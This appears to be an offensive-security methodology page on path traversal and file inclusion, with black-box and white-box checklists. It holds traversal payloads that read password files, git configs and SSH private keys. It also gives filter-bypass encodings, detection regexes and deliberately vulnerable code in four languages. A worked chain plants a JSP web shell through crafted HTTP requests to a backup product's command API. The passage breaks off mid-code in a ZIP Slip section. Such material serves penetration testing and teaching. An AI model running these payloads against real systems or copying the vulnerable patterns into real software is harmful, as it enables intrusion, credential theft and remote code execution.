# Directory Traversal File Include

## Check List

## Methodology

### Black Box

#### [Directory Traversal (Local File Inclusion)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#local-file-inclusion)

{% stepper %}
{% step %}
Identify endpoints serving static assets or files such as `/assets/`, `/static/`, `/files/`, or similar paths
{% endstep %}

{% step %}
Map the base directory by requesting valid assets like `/assets/logo.png` or `/assets/style.css`
{% endstep %}

{% step %}
Capture legitimate request using proxy tools like Burp Suite or curl
{% endstep %}

{% step %}
Modify the file path parameter to include traversal sequence `../` immediately after the asset base
{% endstep %}

{% step %}
Construct payload URL as `https://target.com/assets/../build.sbt`
{% endstep %}

{% step %}
Send request and inspect response for non-asset file contents
{% endstep %}

{% step %}
Test for project configuration files using `/assets/../.git/config`
{% endstep %}

{% step %}
Attempt access to build files with `/assets/../build.sbt` or `/assets/../pom.xml`
{% endstep %}

{% step %}
Test traversal to root directory files like `/assets/../../../../../etc/passwd`
{% endstep %}

{% step %}
Verify Windows environments with `/assets/../../../../../windows/win.ini`
{% endstep %}

{% step %}
Test encoded variations using `%2e%2e%2f` for `../` to bypass basic filters
{% endstep %}

{% step %}
Attempt double encoding `%252e%252e%252f` if single encoding is blocked
{% endstep %}

{% step %}
Verify if trailing slash affects traversal like `/assets/../build.sbt/`
{% endstep %}

{% step %}
Test null byte injection with `/assets/../build.sbt%00.png` if language supports it
{% endstep %}
{% endstepper %}

***

#### File Path & File Access Vulnerabilities

{% stepper %}
{% step %}
Perform reconnaissance by crawling the target website to enumerate all accessible endpoints
{% endstep %}

{% step %}
Use tools like gau to extract archived URLs from various sources and save to a file
{% endstep %}

{% step %}
Employ Burp Suite Spider or custom scripts to crawl and identify hidden or dynamic parameters
{% endstep %}

{% step %}
Collect all URLs into a list for further analysis
{% endstep %}

{% step %}
Filter URLs to identify parameters tied to file operations such as&#x20;

```
file=, document=, folder=, root=, path=, pg=, style=, pdf=, template=, 
php_path=, doc=, page=, name=, cat=, dir=, action=, board=, date=, detail=,
download=, prefix=, include=, inc=, locate=, show=, site=, type=, view=,
content=, layout=, mod=, conf=, url=
```
{% endstep %}

{% step %}
Automate parameter filtering using gf patterns or Burp Suite search functionality
{% endstep %}

{% step %}
Utilize scripts like <sub>PwnTraverse</sub> to highlight potentially dangerous parameters in the URL list
{% endstep %}

{% step %}
Manually inspect isolated parameters for user-controlled input leading to inclusion
{% endstep %}

{% step %}
Capture baseline requests for each parameter using proxy tools like Burp Suite or browser developer tools
{% endstep %}

{% step %}
Test parameters with legitimate file names to confirm normal functionality
{% endstep %}

{% step %}
Inject traversal sequences like `../` to attempt escaping the intended directory
{% endstep %}

{% step %}
Replace parameter values with payloads such as `../etc/passwd` or `../../etc/passwd`
{% endstep %}

{% step %}
Send modified requests and examine response contents for sensitive file disclosure
{% endstep %}

{% step %}
Verify if responses contain system file contents like `/etc/passwd` or directory listings
{% endstep %}

{% step %}
Test additional payloads including `../../../var/www/html/config.php` and `../../../../root/.ssh/id_rsa`
{% endstep %}

{% step %}
Check HTTP response status codes for successful access such as 200 OK
{% endstep %}

{% step %}
Test across different traversal depths by adding more `../` sequences
{% endstep %}

{% step %}
Verify vulnerability on Unix/Linux by targeting `/etc/passwd` and on Windows by targeting files like `C:/Windows/system.ini`
{% endstep %}
{% endstepper %}

***

#### [Path Traversal Filter Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#null-byte)

{% stepper %}
{% step %}
Many applications that place user input into file paths implement some kind of defense against path traversal attacks, and these can often be circumvented
{% endstep %}

{% step %}
if application blocks or strips directory traversal sequence there is many bypassing technique is available
{% endstep %}

{% step %}
we might directly access absolute path `file=/etc/passwd` with out using any traversal
{% endstep %}

{% step %}
You might be able to use various non-standard encoding, such as `..%c0%af` or `..%252f`, to bypass the input filter
{% endstep %}

{% step %}
filter-bypass-technique might user `....//` or `....\` if one `..../` or `....\` is blocked than after removing them we traverse it
{% endstep %}

{% step %}
If an application requires that the user-supplied filename must start with the expected base folder, such as `/var/www/images`, then it might be possible to include the required base folder followed by suitable traversal sequences. For example `filename=/var/www/images/../../../etc/passwd`
{% endstep %}

{% step %}
If an application requires that the user-supplied filename must end with an expected file extension, such as `.png`, then it might be possible to use a null byte to effectively terminate the file path before the required extension. For example`filename=../../../etc/passwd%00.png`
{% endstep %}
{% endstepper %}

***

#### File Upload Path Traversal (Upload-Based Path Traversal)

{% stepper %}
{% step %}
locate file-related endpoints like `/fileupload`
{% endstep %}

{% step %}
Capture the file upload request using a proxy tool like Burp Suite or curl
{% endstep %}

{% step %}
Test file upload functionality by sending a benign file with a command like&#x20;

```bash
curl -X POST -F "file=@test.txt" https://target.com/fileupload/
```
{% endstep %}

{% step %}
Verify if the uploaded file is publicly accessible by checking the returned URL in a browser
{% endstep %}

{% step %}
Confirm the file’s storage location, noting any CDN or external hosting like cdn.bubble.io
{% endstep %}

{% step %}
Attempt to upload a file with a path traversal sequence in the filename, such as `../../../../../../../etc/passwd`
{% endstep %}

{% step %}
Send the traversal payload using curl and Burp Suite Request

```bash
curl -X POST -F "file=@../../../../../../../etc/passwd" https://target.com/fileupload/
```
{% endstep %}

{% step %}
Check the response for a URL pointing to the uploaded file and access it in a browser
{% endstep %}

{% step %}
Test multiple traversal depths `(../../, ../../../, etc.)` to bypass directory restrictions
{% endstep %}

{% step %}
Attempt to access additional sensitive files like `/etc/group`, `/etc/hosts`, `/etc/hostname`, `/etc/resolv.conf`, `/etc/fstab`, `/etc/profile`, `/etc/issue`, `/etc/nginx/nginx.conf`, and `/etc/mysql/mariadb.conf.d/50-server.cnf`
{% endstep %}
{% endstepper %}

***

### White Box

#### Path Injection

{% stepper %}
{% step %}
Map the entire target system using Burp Suite tools
{% endstep %}

{% step %}
Map start and end points in Xmind
{% endstep %}

{% step %}
Decompile the program into the language it was written in
{% endstep %}

{% step %}
Look for file receiving parameters in the endpoints, such as path or filename parameters
{% endstep %}

{% step %}
Then, in the file reception processing logic, check whether the process reads the file directly or not, like the code below

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regex
(?<Source>Request\.(Query|Params|RouteValues))|(?<Sink>HttpClient\s*\(|GetAsync\s*\(|WebRequest\.Create)
```
{% endtab %}

{% tab title="Java" %}
```regex
(?<Source>request\.getParameter|@PathVariable|@RequestParam)|(?<Sink>HttpClient|HttpURLConnection|\.openConnection\s*\(|\.execute\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regex
(?<Source>\$_(GET|POST|REQUEST))|(?<Sink>curl_exec|file_get_contents\s*\(|fsockopen\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(?<Source>req\.(params|query|body))|(?<Sink>http\.get\s*\(|axios\s*\(|fetch\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux)**

{% tabs %}
{% tab title="C#" %}
```regex
(Request\.(Query|Params|RouteValues))|(HttpClient\s*\(|GetAsync\s*\(|WebRequest\.Create)
```
{% endtab %}

{% tab title="Java" %}
```regex
(request\.getParameter|@PathVariable|@RequestParam)|(HttpClient|HttpURLConnection|\.openConnection\s*\(|\.execute\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regex
(\$_(GET|POST|REQUEST))|(curl_exec|file_get_contents\s*\(|fsockopen\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(req\.(params|query|body))|(http\.get\s*\(|axios\s*\(|fetch\s*\()
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```c#
string apiBase = "https://my.api/api/v1";
string orderApi = apiBase + "/order/get";

string apiUrl = orderApi + request.Params["orderId"];

var response = http.Get(apiUrl);
```
{% endtab %}

{% tab title="Java" %}
```java
String apiBase = "https://my.api/api/v1";
String orderApi = apiBase + "/order/get";

String apiUrl = orderApi + request.getParameter("orderId");

HttpResponse<String> response = http.get(apiUrl);
```
{% endtab %}

{% tab title="PHP" %}
```php
$apiBase = "https://my.api/api/v1";
$orderApi = $apiBase . "/order/get";

$apiUrl = $orderApi . $request->params['orderId'];

$response = $http->get($apiUrl);
```
{% endtab %}

{% tab title="Node.js" %}
```js
const apiBase = "https://my.api/api/v1";
const orderApi = apiBase + "/order/get";

const apiUrl = orderApi + request.params.orderId;

const response = http.get(apiUrl);
```
{% endtab %}
{% endtabs %}
{% endstep %}
{% endstepper %}

***

#### Path Traversal + SSRF

{% stepper %}
{% step %}
Map the entire target system using the Burp Suite tool
{% endstep %}

{% step %}
Draw the entry points and endpoints in XMind
{% endstep %}

{% step %}
Decompile the application based on the programming language used
{% endstep %}

{% step %}
Look for features that allow downloading files from an external source
{% endstep %}

{% step %}
Then review the method or function that processes the endpoint of this feature, like in the code below

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regex
(?<Source>Request\.(Query|Form|Params))|(?<Sink>WebRequest\.Create\s*\(|HttpClient\s*\(|GetStreamAsync\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regex
(?<Source>@RequestParam|@PathVariable|request\.getParameter|\bString\s+\w+\s*\))|(?<Sink>new\s+URL\s*\(|\.openStream\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regex
(?<Source>\$_(GET|POST|REQUEST))|(?<Sink>file_get_contents\s*\(|curl_exec\s*\(|fopen\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(?<Source>req\.(query|params|body))|(?<Sink>http\.get\s*\(|https\.get\s*\(|axios\s*\(|fetch\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regex
(Request\.(Query|Form|Params))|(WebRequest\.Create\s*\(|HttpClient\s*\(|GetStreamAsync\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regex
(@RequestParam|@PathVariable|request\.getParameter|\bString\s+\w+\s*\))|(new\s+URL\s*\(|\.openStream\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regex
(\$_(GET|POST|REQUEST))|(file_get_contents\s*\(|curl_exec\s*\(|fopen\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(req\.(query|params|body))|(http\.get\s*\(|https\.get\s*\(|axios\s*\(|fetch\s*\()
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public void DownloadSubtitles(string subtitleName, string url, string subtitleLanguage, object videoId)
{
    // ...
    using (var outStream = new FileStream(filePath, FileMode.Create))
    using (var webStream = new System.Net.WebClient().OpenRead(url)) // Oops, user controls this URL
    {
        int b;
        while ((b = webStream.ReadByte()) != -1)
        {
            outStream.WriteByte((byte)b);
        }
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public void downloadSubtitles(String subtitleName, String url, String subtitleLanguage, Object videoId) throws Exception {
    // ...
    try (FileOutputStream out = new FileOutputStream(filePath);
         InputStream in = new URL(url).openStream()) { // Oops, user controls this URL

        int b;
        while ((b = in.read()) != -1) {
            out.write(b);
        }
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function downloadSubtitles($subtitleName, $url, $subtitleLanguage, $videoId)
{
    // ...
    $out = fopen($filePath, 'w');
    $in = fopen($url, 'r'); // Oops, user controls this URL

    while (!feof($in)) {
        fwrite($out, fgetc($in));
    }

    fclose($in);
    fclose($out);
}
```
{% endtab %}

{% tab title="Node.js" %}
```js

function downloadSubtitles(subtitleName, url, subtitleLanguage, videoId) {
    // ...
    const file = fs.createWriteStream(filePath);

    const client = url.startsWith('https') ? https : http;

    client.get(url, (response) => { // Oops, user controls this URL
        response.on('data', (chunk) => {
            file.write(chunk);
        });

        response.on('end', () => {
            file.end();
        });
    });
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
After downloading the file, check in the code whether it calls functions that perform extraction, such as unzip methods or similar functions

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regex
(?<Source>Request\.(Query|Form|Params))|(?<Sink>FileStream\s*\(|File\.WriteAll|Path\.Combine)
```
{% endtab %}

{% tab title="Java" %}
```regex
(?<Source>@RequestParam|@PathVariable|request\.getParameter|\bString\s+\w+File(Name)?\b)|(?<Sink>new\s+FileOutputStream\s*\(|Files\.write\s*\(|new\s+File\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regex
(?<Source>\$_(GET|POST|FILES|REQUEST))|(?<Sink>fopen\s*\(|file_put_contents\s*\(|move_uploaded_file)
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(?<Source>req\.(body|query|params|files))|(?<Sink>fs\.writeFile|fs\.createWriteStream|path\.join)
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regex
(Request\.(Query|Form|Params))|(FileStream\s*\(|File\.WriteAll|Path\.Combine)
```
{% endtab %}

{% tab title="Java" %}
```regex
(@RequestParam|@PathVariable|request\.getParameter|\bString\s+\w+File(Name)?\b)|(new\s+FileOutputStream\s*\(|Files\.write\s*\(|new\s+File\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regex
(\$_(GET|POST|FILES|REQUEST))|(fopen\s*\(|file_put_contents\s*\(|move_uploaded_file)
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(req\.(body|query|params|files))|(fs\.writeFile|fs\.createWriteStream|path\.join)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public static string UnzipFile(string stagingDir, string zipFileName, string originalFileName)
{
    // ...
    var fos = new FileStream($"{stagingDir}/{originalFileName}", FileMode.Create); // User controls originalFileName

    // Write the file...

    // Later, it gets renamed, but the damage is already done
    File.Move(filePath, newFilePath);

    return newFilePath;
}
```
{% endtab %}

{% tab title="Java" %}
```java
static String unzipFile(String stagingDir, String zipFileName, String originalFileName) throws Exception {
    // ...
    FileOutputStream fos = new FileOutputStream(stagingDir + "/" + originalFileName);  // User controls originalFileName

    // Write the file...

    // Later, it gets renamed, but the damage is already done
    file.renameTo(newFile);

    return newFile.getPath();
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public static function unzipFile($stagingDir, $zipFileName, $originalFileName)
{
    // ...
    $fos = fopen($stagingDir . "/" . $originalFileName, 'w'); // User controls originalFileName

    // Write the file...

    // Later, it gets renamed, but the damage is already done
    rename($filePath, $newFilePath);

    return $newFilePath;
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function unzipFile(stagingDir, zipFileName, originalFileName) {
    // ...
    const fos = fs.createWriteStream(`${stagingDir}/${originalFileName}`); // User controls originalFileName

    // Write the file...

    // Later, it gets renamed, but the damage is already done
    fs.renameSync(filePath, newFilePath);

    return newFilePath;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}
{% endstepper %}

***

#### Path Traversal to RCE

{% stepper %}
{% step %}
Map the entire target system or product using the Burp Suite tool
{% endstep %}

{% step %}
Draw the entry points and endpoints in XMind
{% endstep %}

{% step %}
Decompile the application based on the programming language used
{% endstep %}

{% step %}
Look for a custom command-line interface (for example, `cmd`)
{% endstep %}

{% step %}
Review the API list and check whether any API directly communicates with the service’s custom command-line interface

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("QCommand/{*command}")]
public IActionResult QCommand(string command, [FromBody] [AllowNull] string req = "")
{
    string reqXmlString = base.GetReqXmlString(req);
    return this.Ok(new CVWebHandlerQAPI().Qcommand(reqXmlString, command));
}

[HttpPost("QCommand")]
public IActionResult ExecuteQCommand([FromBody] string command)
{
    return this.Ok(new CVWebHandlerQAPI().Qcommand(null, command));
}

[HttpPost("ExecuteQCommand")]
public IActionResult ExecuteQCommand2([FromBody] NameValueCollection data)
{
    string text = string.Empty;
    string reqJson = string.Empty;
    string reqXml = string.Empty;

    if (data != null && data.Get("command") != null)
    {
        text = data.Get("command");
    }

    if (data != null && data.Get("inputRequestXML") != null)
    {
        reqJson = data.Get("inputRequestXML");
        reqXml = base.GetReqXmlString(reqJson);
    }

    if (string.IsNullOrEmpty(text))
    {
        throw new HandlerException(HandlerError.OperationNotSupported, -1, "Invalid input. Input request command  is required.", null, "ExecuteQCommand2", 63);
    }

    return this.Ok(new CVWebHandlerQAPI().Qcommand(reqXml, text));
}
```
{% endtab %}

{% tab title="Java" %}
```java
@PostMapping("QCommand/{command:.+}")
public ResponseEntity<?> QCommand(@PathVariable String command, @RequestBody(required = false) String req) {
    String reqXmlString = getReqXmlString(req);
    return ResponseEntity.ok(new CVWebHandlerQAPI().Qcommand(reqXmlString, command));
}

@PostMapping("QCommand")
public ResponseEntity<?> ExecuteQCommand(@RequestBody String command) {
    return ResponseEntity.ok(new CVWebHandlerQAPI().Qcommand(null, command));
}

@PostMapping("ExecuteQCommand")
public ResponseEntity<?> ExecuteQCommand2(@RequestBody MultiValueMap<String, String> data) {
    String text = "";
    String reqJson = "";
    String reqXml = "";

    if (data != null && data.getFirst("command") != null) {
        text = data.getFirst("command");
    }

    if (data != null && data.getFirst("inputRequestXML") != null) {
        reqJson = data.getFirst("inputRequestXML");
        reqXml = getReqXmlString(reqJson);
    }

    if (text.isEmpty()) {
        throw new HandlerException(HandlerError.OperationNotSupported, -1, "Invalid input. Input request command is required.", null, "ExecuteQCommand2", 63);
    }

    return ResponseEntity.ok(new CVWebHandlerQAPI().Qcommand(reqXml, text));
}
```
{% endtab %}

{% tab title="PHP" %}
```php
/**
 * @Route("/QCommand/{command}", methods={"POST"})
 */
function QCommand($command, ?string $req = "") {
    $reqXmlString = $this->getReqXmlString($req);
    return $this->ok((new CVWebHandlerQAPI())->Qcommand($reqXmlString, $command));
}

/**
 * @Route("/QCommand", methods={"POST"})
 */
function ExecuteQCommand(string $command) {
    return $this->ok((new CVWebHandlerQAPI())->Qcommand(null, $command));
}

/**
 * @Route("/ExecuteQCommand", methods={"POST"})
 */
function ExecuteQCommand2(array $data) {
    $text = "";
    $reqJson = "";
    $reqXml = "";

    if (!empty($data['command'])) {
        $text = $data['command'];
    }

    if (!empty($data['inputRequestXML'])) {
        $reqJson = $data['inputRequestXML'];
        $reqXml = $this->getReqXmlString($reqJson);
    }

    if (empty($text)) {
        throw new HandlerException(HandlerError::OperationNotSupported, -1, "Invalid input. Input request command is required.", null, "ExecuteQCommand2", 63);
    }

    return $this->ok((new CVWebHandlerQAPI())->Qcommand($reqXml, $text));
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
app.post("/QCommand/:command", (req, res) => {
    let command = req.params.command;
    let reqXmlString = getReqXmlString(req.body || "");
    res.json(new CVWebHandlerQAPI().Qcommand(reqXmlString, command));
});

app.post("/QCommand", (req, res) => {
    let command = req.body;
    res.json(new CVWebHandlerQAPI().Qcommand(null, command));
});

app.post("/ExecuteQCommand", (req, res) => {
    let data = req.body || {};
    let text = "";
    let reqJson = "";
    let reqXml = "";

    if (data.command) {
        text = data.command;
    }

    if (data.inputRequestXML) {
        reqJson = data.inputRequestXML;
        reqXml = getReqXmlString(reqJson);
    }

    if (!text) {
        throw new HandlerException(HandlerError.OperationNotSupported, -1, "Invalid input. Input request command is required.", null, "ExecuteQCommand2", 63);
    }

    res.json(new CVWebHandlerQAPI().Qcommand(reqXml, text));
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
In the documentation of the target service’s custom CLI, review the list of commands and check whether there is a command that performs an operational execution process (such as `qoperation execute`)

```bash
qoperation execute
```
{% endstep %}

{% step %}
Run the command in the CLI and use the `h-` switch for the target command to check which switches it supports

```bash
qoperation execute -h
```
{% endstep %}

{% step %}
Look for switches named `file-` that receive a file or export the output of a command

```powershell
Options:
-cs    Commserver host name
..[]..
-h     Displays this help string
-af    Reads xml input for job ids from a file
..[]..
-file    File Name where output is to be written
```
{% endstep %}

{% step %}
If the `file-` switch is used to store the output of a command, check whether you can control the file output path and specify the output type, like in the command below

```bash
qoperation execute -file F:\Program Files\Commvault\ContentStore\Apache\webapps\root\wat.jsp
```
{% endstep %}

{% step %}
At this stage, the output content must be controlled. Look for switches in the `qoperation execute` command that accept input and execute it. In this example, the `-af` switch places operations inside an XML file, passes it to the command, and executes it
{% endstep %}

{% step %}
Extract the list of available operations, for example `App_GetUserPropertiesRequest`, which returns user properties and must be placed inside an XML file on the local system

```xml
<App_GetUserPropertiesRequest level="30">
	<user userName="unk9vvn" />
</App_GetUserPropertiesRequest>
```
{% endstep %}

{% step %}
After execution with the `af-` switch and providing the local path of the XML file containing the operation, the output file will contain the user properties

```xml
> qoperation execute -af C:\Users\Public\script.xml

output :

<App_GetUserPropertiesResponse>

  <users UPN="" agePasswordDays="0" associatedExternalUserGroupsOperationType="ADD" associatedUserGroupsOperationType="ADD" authenticationMethod="LOCAL" companyName="Commcell" description="This is localadmin" edgeDriveQuotaLimitInGB="100" email="" enableUser="true" enforceEdgeDriveQuota="false" enforceFSQuota="false" fullName="WIN-AC7GJT5_localadmin__" idleTime="0" inheritGroupEdgeDriveQuotaSettings="true" inheritGroupQuotaSettings="true" isAccountLocked="false" istfaEnabled="false" lastLogIntime="1745939401" loggedInMode="2" quotaLimitInGB="100" removeOtherActiveSessions="true">
    <userEntity userGUID="F52B43CB-26F8-4695-B0E8-94EC2F9DE0C9" userId="5" userName="WIN-AC7GJT5_localadmin__"/>
    <LinkedCommvaultUser/>
    <apiQuota APILimit="0" APItimeFrame="0"/>
    <currentAuthenticator IdentityServerId="0" IdentityServerName="Commcell">
      <ownerCompany domainName="Commcell" id="0"/>
    </currentAuthenticator>
  </users>

</App_GetUserPropertiesResponse>
```
{% endstep %}

{% step %}
Then look for APIs that allow modifying user properties in a way that a JSP payload can be inserted. For example, the code below handles updating user properties

```csharp
[HttpPost("User/{*userId}")]
public IActionResult UpdateUserProperties([FromBody] UpdateUserPropertiesRequest request, string userId)
{
	string empty = string.Empty;
	AppMsg.UserInfo userInfo = request.users[0];
	if (userInfo.userEntity == null)
	{
		userInfo.userEntity = new UserEntity();
	}
	int userId2;
	if (int.TryParse(userId, out userId2))
	{
		userInfo.userEntity.userId = userId2;
	}
	else
	{
		userInfo.userEntity.userName = base.GetConvertedUserEntity(userId).userName;
	}
	return this.Ok(this.UpdateUserProperties(request, this.LoggedInUserId, this.CurrentLocaleId));
}
```
{% endstep %}

{% step %}
Add a user property that does not have strict character or length limitations, such as description or bio, and place the malicious payload inside that property in the API request

```http
POST /commandcenter/RestServlet/User/5 HTTP/1.1
Host: example.com
Accept: application/xml
Authtoken: QSDK 3d4ab7f7def2...
Content-Length: 270

<App_UpdateUserPropertiesRequest><users>
<AppMsg.UserInfo>
<userEntity>
<userId>5</userId>
</userEntity>
<description>&lt;% Runtime.getRuntime().exec(request.getParameter("cmd")); %&gt;</description>
</AppMsg.UserInfo>
</users></App_UpdateUserPropertiesRequest>
```
{% endstep %}

{% step %}
If, after executing the command, the characters `“` and `>` in the `wT-poc.jsp` output file are HTML-encoded and this breaks the shell execution

```bash
qoperation execute -af F:\Program Files\Commvault\ContentStore\Reports\MetricsUpload\Upload\ABC1234\rekt.xml -file F:\Program Files\Commvault\ContentStore\Apache\webapps\ROOT\wT-poc.jsp
```

Instead of using the characters `“` and `>` directly, use JSP Expression Language (EL) in Java to bypass HTML encoding and execute the shell code

```http
POST /commandcenter/RestServlet/User/5 HTTP/1.1
Host: example.com
Accept: application/xml
Authtoken: QSDK 3db346462...
Content-type: application/xml
Content-Length: 333

<App_UpdateUserPropertiesRequest><users>
<AppMsg.UserInfo>
<userEntity>
<userId>5</userId>
</userEntity>
<description>${pageContext.servletContext.getClassLoader().loadClass('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec(param.cmd)}
</description>
</AppMsg.UserInfo>
</users></App_UpdateUserPropertiesRequest>
```
{% endstep %}

{% step %}
Then resend your request to the server’s custom CLI API

```http
POST /commandcenter/RestServlet/QCommand HTTP/1.1
Host: example.com
Authtoken: QSDK 3db346462c1de...
Content-type: text/plain
Content-Length: 185

qoperation execute -af F:\Program Files\Commvault\ContentStore\Reports\MetricsUpload\Upload\ABC1234\rekt.xml -file F:\Program Files\Commvault\ContentStore\Apache\webapps\ROOT\wT-poc.jsp
```
{% endstep %}

{% step %}
If the server responds with the expected result, the vulnerability is confirmed

```http
HTTP/1.1 200 
...

Operation Successful.Results written to [F:\Program Files\Commvault\ContentStore\Apache\webapps\ROOT\wT-poc.jsp].
```
{% endstep %}
{% endstepper %}

***

#### Path Traversal (ZIP Slip variant)

{% stepper %}
{% step %}
Map the entire target system or product using the Burp Suite tool
{% endstep %}

{% step %}
Draw the entry points and endpoints in XMind
{% endstep %}

{% step %}
Decompile the application based on the programming language used
{% endstep %}

{% step %}
In the service, look for endpoints named import, Restore, or Upload
{% endstep %}

{% step %}
Find the processing logic of these endpoints in the code and check under what conditions the code reaches the file processing stage

{% tabs %}
{% tab title="C#" %}
```csharp
protected override void OnLoad(EventArgs e)
{
	base.OnLoad(e);
	if (base.IsEvent)
	{
		return;
	}
	if (base.Request.Files.Count <= 0)
	{
		return;
	}
	UrlHandle urlHandle;
	if (!UrlHandle.TryGetHandle(out urlHandle) || urlHandle == null) // [1]
	{
		SecurityException ex = new SecurityException("Upload handle invalid");
		Log.Error("File upload handle not found. Path: " + base.Request.Form["Path"], ex, this);
		throw ex;
	}
	string folder = urlHandle["Path"]; // [2]
	string text = urlHandle["Item"];
	string name = urlHandle["Language"];
	bool overwrite = urlHandle["Overwrite"] == "1";
	bool unpack = urlHandle["Unzip"] == "1";
	bool versioned = urlHandle["Versioned"] == "1";
	string allowedFileTypes = urlHandle["AllowedFileTypes"];
	UrlHandle.DisposeHandle(urlHandle);
	UploadArgs uploadArgs = new UploadArgs // [3]
	{
		Files = base.Request.Files,
		Overwrite = overwrite,
		Unpack = unpack,
		Versioned = versioned,
		Language = Language.Parse(name),
		AllowedFileTypes = allowedFileTypes
	};
	if (!string.IsNullOrEmpty(text)) // [4]
	{
		uploadArgs.Folder = text;
		uploadArgs.Destination = UploadDestination.Database;
	}
	else
	{
		uploadArgs.Folder = folder;
		uploadArgs.Destination = UploadDestination.File;
		uploadArgs.FileOnly = true; // [5]
	}
	Pipeline pipeline = PipelineFactory.GetPipeline("uiUpload"); // [6]
	pipeline.Start(uploadArgs);
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Override
protected void onLoad(EventArgs e) {
    super.onLoad(e);

    if (this.isEvent()) {
        return;
    }

    if (this.getRequest().getFiles().size() <= 0) {
        return;
    }

    UrlHandle urlHandle;
    if (!UrlHandle.tryGetHandle(urlHandleHolder -> urlHandle = urlHandleHolder) || urlHandle == null) {
        SecurityException ex = new SecurityException("Upload handle invalid");
        Log.error("File upload handle not found. Path: " + this.getRequest().getForm().get("Path"), ex, this);
        throw ex;
    }

    String folder = urlHandle.get("Path");
    String text = urlHandle.get("Item");
    String name = urlHandle.get("Language");
    boolean overwrite = "1".equals(urlHandle.get("Overwrite"));
    boolean unpack = "1".equals(urlHandle.get("Unzip"));
    boolean versioned = "1".equals(urlHandle.get("Versioned"));
    String allowedFileTypes = urlHandle.get("AllowedFileTypes");

    UrlHandle.disposeHandle(urlHandle);

    UploadArgs uploadArgs = new UploadArgs();
    uploadArgs.setFiles(this.getRequest().getFiles());
    uploadArgs.setOverwrite(overwrite);
    uploadArgs.setUnpack(unpack);
    uploadArgs.setVersioned(versioned);
    uploadArgs.setLanguage(Language.parse(name));
    uploadArgs.setAllowedFileTypes(allowedFileTypes);

    if (text != null && !text.isEmpty()) {
        uploadArgs.setFolder(text);
        uploadArgs.setDestination(UploadDestination.Database);
    } else {
        uploadArgs.setFolder(folder);
        uploadArgs.setDestination(UploadDestination.File);
        uploadArgs.setFileOnly(true);
    }

    Pipeline pipeline = PipelineFactory.getPipeline("uiUpload");
    pipeline.start(uploadArgs);
}
```
{% endtab %}

{% tab title="PHP" %}
```php
protected function onLoad($e)
{
    parent::onLoad($e);

    if ($this->isEvent()) {
        return;
    }

    if (count($this->request->files) <= 0) {
        return;
    }

    $urlHandle = null;
    if (!UrlHandle::tryGetHandle($urlHandle) || $urlHandle == null) {
        $ex = new SecurityException("Upload handle invalid");
        Log::error("File upload handle not found. Path: " . $this->request->form["Path"], $ex, $this);
        throw $ex;
    }

    $folder = $urlHandle["Path"];
    $text = $urlHandle["Item"];
    $name = $urlHandle["Language"];
    $overwrite = $urlHandle["Overwrite"] === "1";
    $unpack = $urlHandle["Unzip"] === "1";
    $versioned = $urlHandle["Versioned"] === "1";
    $allowedFileTypes = $urlHandle["AllowedFileTypes"];

    UrlHandle::disposeHandle($urlHandle);

    $uploadArgs = new UploadArgs();
    $uploadArgs->Files = $this->request->files;
    $uploadArgs->Overwrite = $overwrite;
    $uploadArgs->Unpack = $unpack;
    $uploadArgs->Versioned = $versioned;
    $uploadArgs->Language = Language::parse($name);
    $uploadArgs->AllowedFileTypes = $allowedFileTypes;

    if (!empty($text)) {
        $uploadArgs->Folder = $text;
        $uploadArgs->Destination = UploadDestination::Database;
    } else {
        $uploadArgs->Folder = $folder;
        $uploadArgs->Destination = UploadDestination::File;
        $uploadArgs->FileOnly = true;
    }

    $pipeline = PipelineFactory::getPipeline("uiUpload");
    $pipeline->start($uploadArgs);
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function onLoad(e) {
    base.onLoad(e);

    if (this.isEvent()) {
        return;
    }

    if (!this.request.files || this.request.files.length <= 0) {
        return;
    }

    let urlHandle = null;

    if (!UrlHandle.tryGetHandle((handle) => { urlHandle = handle; }) || urlHandle == null) {
        let ex = new SecurityException("Upload handle invalid");
        Log.error("File upload handle not found. Path: " + this.request.form["Path"], ex, this);
        throw ex;
    }

    let folder = urlHandle["Path"];
    let text = urlHandle["Item"];
    let name = urlHandle["Language"];
    let overwrite = urlHandle["Overwrite"] === "1";
    let unpack = urlHandle["Unzip"] === "1";
